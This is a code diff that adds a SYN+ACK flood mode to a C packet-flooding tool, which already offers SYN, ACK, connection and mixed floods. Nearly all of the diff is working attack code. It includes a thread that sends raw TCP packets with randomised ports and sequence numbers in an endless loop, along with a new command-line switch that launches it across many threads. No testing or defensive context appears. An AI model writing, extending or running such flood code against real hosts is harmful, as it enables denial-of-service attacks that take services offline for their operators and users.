@@ -24,6 +24,7 @@ enum e_action {
     CONN_FLOOD,
     SYN_FLOOD,
     ACK_FLOOD,
+    SYNACK_FLOOD,
     UDP_FLOOD,
     MIX_FLOOD,
     MIX2_FLOOD,
@@ -643,6 +644,36 @@ void *syn_flood_attack_thread(void *param)
     return NULL;
 }
 
+/* SYN+ACK flood */
+void *synack_flood_attack_thread(void *param)
+{
+    uint32_t dest_addr;
+    uint16_t dest_port;
+
+    struct leef_handle leef;
+    if(!leef_init(&leef, interface, INJECTING))
+        return NULL;
+
+    if(rawsendto)
+        leef_enable_rawsendto(&leef, src_mac, dest_mac);
+
+    while(running) {
+        get_dest(&dest_addr, &dest_port);
+
+        leef_send_raw_tcp2(&leef,
+                           get_src_ip(), dest_addr,
+                           leef_random_src_port(), dest_port ? dest_port : leef_random_dest_port(),
+                           leef_random_u16(), leef_random_u32(), leef_random_u32(),
+                           TCP_SYN |TCP_ACK,
+                           0, NULL);
+        if(sleep_interval)
+            usleep(sleep_interval);
+    }
+
+    leef_terminate(&leef);
+    return NULL;
+}
+
 /* ACK flood */
 void *ack_flood_attack_thread(void *param)
 {
@@ -963,6 +994,7 @@ void print_help(char **argv)
     printf("  -C                - Connection flood\n");
     printf("  -S                - SYN flood\n");
     printf("  -A                - ACK flood\n");
+    printf("  -X                - SYN+ACK flood\n");
     printf("  -D                - PA flood\n");
     printf("  -M                - Mixed S/A/PA/FA flood\n");
     printf("  -N                - Mixed A/PA/FA flood\n");
@@ -1031,6 +1063,9 @@ int main(int argc, char **argv)
                     break;
                 case 'A':
                     action = ACK_FLOOD;
+                    break;
+                case 'X':
+                    action = SYNACK_FLOOD;
                     break;
                 case 'P':
                     action = TCP_PING;
@@ -1415,6 +1450,12 @@ int main(int argc, char **argv)
             if(!quiet) printf("SYN FLOOD\n");
             for(i=0; i < num_threads; ++i)
                 pthread_create(&threads[i], NULL, syn_flood_attack_thread, NULL);
+            interface_tx_thread();
+            break;
+        case SYNACK_FLOOD:
+            if(!quiet) printf("SYNACK FLOOD\n");
+            for(i=0; i < num_threads; ++i)
+                pthread_create(&threads[i], NULL, synack_flood_attack_thread, NULL);
             interface_tx_thread();
             break;
         case ACK_FLOOD:
